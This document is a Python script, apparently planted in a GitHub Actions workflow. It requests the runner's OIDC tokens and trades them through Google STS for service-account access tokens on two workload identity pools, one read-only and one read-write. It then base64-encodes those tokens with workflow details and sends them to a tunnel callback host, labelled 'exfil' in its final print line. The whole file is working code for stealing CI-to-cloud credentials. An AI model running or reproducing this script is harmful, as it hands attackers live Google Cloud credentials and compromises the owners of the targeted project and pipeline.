import os, json, base64, time, urllib.request, urllib.parse, urllib.error

CB = "https://gtdll-2a0a-4cc0-c2-58ae-1834-a2ff-fee8-1223.run.pinggy-free.link/gcp"
PROVIDERS = {
    "ro": (
        "//iam.googleapis.com/projects/938607797672/locations/global/workloadIdentityPools/matrix-pool-ro/providers/matrix-gh-provider-ro",
        "sa-github-actions-ro@mtrx-hub-dev-3of.iam.gserviceaccount.com",
    ),
    "rw": (
        "//iam.googleapis.com/projects/938607797672/locations/global/workloadIdentityPools/matrix-pool-rw/providers/matrix-gh-provider-rw",
        "sa-github-actions-rw@mtrx-hub-dev-3of.iam.gserviceaccount.com",
    ),
}


def http(url, data=None, headers=None, timeout=25):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, body
    except Exception as e:
        return None, repr(e)


out = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
env = os.environ
out["workflow"] = {
    k: env.get(k)
    for k in [
        "GITHUB_REPOSITORY",
        "GITHUB_REPOSITORY_OWNER",
        "GITHUB_REF",
        "GITHUB_REF_NAME",
        "GITHUB_EVENT_NAME",
        "GITHUB_ACTOR",
        "GITHUB_WORKFLOW_REF",
        "RUNNER_ENVIRONMENT",
    ]
}
st, body = http("https://api.ipify.org?format=json", timeout=10)
out["egress_ip"] = body[:200]

tok_url = env.get("ACTIONS_ID_TOKEN_REQUEST_URL")
tok = env.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
out["oidc_env"] = bool(tok_url and tok)


def get_oidc(aud):
    if not (tok_url and tok):
        return None, "no oidc env"
    sep = "&" if "?" in tok_url else "?"
    u = tok_url + sep + "audience=" + urllib.parse.quote(aud, safe="")
    st, b = http(u, headers={"Authorization": "bearer " + tok})
    if st != 200:
        return None, "oidc http %s: %s" % (st, b[:500])
    try:
        return json.loads(b)["value"], None
    except Exception as e:
        return None, "oidc parse %s: %s" % (e, b[:500])


def jwt_claims(j):
    try:
        p = j.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode("utf-8", "replace"))
    except Exception as e:
        return {"err": str(e)}


for name, (prov, sa) in PROVIDERS.items():
    entry = {}
    oidc, err = get_oidc(prov)
    if oidc:
        entry["oidc_claims"] = jwt_claims(oidc)
        form = urllib.parse.urlencode(
            {
                "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
                "audience": prov,
                "scope": "https://www.googleapis.com/auth/cloud-platform",
                "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
                "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
                "subject_token": oidc,
            }
        ).encode()
        st, b = http(
            "https://sts.googleapis.com/v1/token",
            form,
            {"Content-Type": "application/x-www-form-urlencoded"},
        )
        entry["sts_status"] = st
        try:
            sj = json.loads(b)
        except Exception:
            sj = None
        if sj and sj.get("access_token"):
            entry["sts_ok"] = True
            fed = sj["access_token"]
            req = json.dumps(
                {
                    "scope": ["https://www.googleapis.com/auth/cloud-platform"],
                    "lifetime": "3600s",
                }
            ).encode()
            st2, b2 = http(
                "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/"
                + urllib.parse.quote(sa, safe="@")
                + ":generateAccessToken",
                req,
                {"Authorization": "Bearer " + fed, "Content-Type": "application/json"},
            )
            entry["imp_status"] = st2
            try:
                entry["imp"] = json.loads(b2)
            except Exception:
                entry["imp_body"] = b2[:1500]
        else:
            entry["sts_body"] = b[:2000]
    else:
        entry["oidc_error"] = err
    out[name] = entry

payload = base64.b64encode(json.dumps(out).encode()).decode()
st, b = http(CB, payload.encode(), {"Content-Type": "text/plain"})
print("exfil status", st, "payload_len", len(payload))
